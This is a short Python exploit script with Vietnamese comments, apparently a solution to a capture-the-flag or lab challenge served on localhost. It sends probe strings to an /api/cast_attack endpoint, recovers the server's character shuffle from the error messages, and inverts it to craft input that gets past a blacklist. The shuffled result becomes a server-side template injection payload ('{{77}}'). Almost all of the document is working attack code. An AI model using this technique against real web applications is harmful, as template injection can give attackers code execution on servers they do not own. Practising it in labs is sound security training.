import requests, re

BASE = "http://127.0.0.1:33333"
PROBE = "abcdefghijklmnopqrstuvwxyz{}0123456789"  # toàn ký tự phân biệt, không dính blacklist

def get_shuffled(s):
    r = requests.get(f"{BASE}/api/cast_attack", params={"attack_name": s})
    j = r.json()
    m = re.search(r"No magic name (.*) here", j.get("error",""))
    return m.group(1) if m else ""

def invert_perm(src, dst):
    # src -> dst là shuffle(src). Trả về P^{-1} để dựng preimage
    pos = {ch:i for i,ch in enumerate(src)}
    inv = [None]*len(dst)
    for i,ch in enumerate(dst):
        inv[i] = pos[ch]  # dst[i] đến từ src[ pos[ch] ]
    return inv

def build_preimage(desired, invP):
    # S[P[i]] = D[i]  =>  S[k] = D[j] nếu invP[j] = k
    S = ["?"]*len(invP)
    for j,k in enumerate(invP):
        if j < len(desired):
            S[k] = desired[j]
        else:
            S[k] = "a"   # đệm bất kỳ cho phần thừa
    return "".join(S)

shuffled = get_shuffled(PROBE)
invP = invert_perm(PROBE, shuffled)

desired = "{{77}}"              # ví dụ chứng minh SSTI
preimage = build_preimage(desired, invP)

print("Preimage to send:", preimage)
print("Shuffled becomes :", get_shuffled(preimage))  # nên ra {{77}}
